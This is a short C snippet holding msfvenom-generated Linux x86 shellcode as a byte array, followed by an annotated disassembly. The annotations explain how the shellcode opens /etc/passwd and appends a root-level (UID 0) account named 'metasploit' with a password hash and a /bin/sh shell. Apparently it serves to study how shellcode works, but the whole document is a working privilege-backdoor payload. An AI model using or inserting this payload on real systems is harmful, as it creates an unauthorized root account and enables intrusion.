
//msfvenom linux/x86/adduser -f c

unsigned char buf[] = 
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x6d\x65"
"\x74\x61\x73\x70\x6c\x6f\x69\x74\x3a\x41\x7a\x2f\x64\x49\x73"
"\x6a\x34\x70\x34\x49\x52\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a"
"\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58"
"\xcd\x80\x6a\x01\x58\xcd\x80";

/*
   0xbfffeede:	xor    ecx,ecx	
   0xbfffeee0:	mov    ebx,ecx
   0xbfffeee2:	push   0x46	;preparing setgid syscall {setgid (%ebx)}
   0xbfffeee4:	pop    eax
   0xbfffeee5:	int    0x80	;setgid to the process will run with group id of the file
   0xbfffeee7:	push   0x5		;preparing open syscall	{open (%ebx , %ecx , %edx )}
   0xbfffeee9:	pop    eax
   0xbfffeeea:	xor    ecx,ecx
   0xbfffeeec:	push   ecx		;pushing null to /etc/passwd
   0xbfffeeed:	push   0x64777373	;pushing /etc/passwd
   0xbfffeef2:	push   0x61702f2f
   0xbfffeef7:	push   0x6374652f
   0xbfffeefc:	mov    ebx,esp
   0xbfffeefe:	inc    ecx	;increments ecx [0] by one for the next instruction to make it 0x401
   0xbfffeeff:	mov    ch,0x4	;open syscall flags
   0xbfffef01:	int    0x80	;opens /etc/passwd
   0xbfffef03:	xchg   ebx,eax
   0xbfffef04:	call   0xbfffef31
   0xbfffef09:	ins    DWORD PTR es:[edi],dx ;the next set of instructions represent [metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh] but gdb's disassembler understand it as instructions rather than a string

   0xbfffef31:	pop    ecx		       ;get "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh" from stack and stores it in ecx
   0xbfffef32:	mov    edx,DWORD PTR [ecx-0x4] ;get length of "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh" and stores it in edx which is [40]
   0xbfffef35:	push   0x4		       ;preparing write syscall {write (%ebx , %ecx , %edx )}
   0xbfffef37:	pop    eax
   0xbfffef38:	int    0x80 		       ;writes "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh" into opened file /etc/passwd with length of [40]
   0xbfffef3a:	push   0x1	;preparing exit syscall  {_exit (%ebx)}
   0xbfffef3c:	pop    eax
   0xbfffef3d:	int    0x80	;exits gracefuly




	

*/
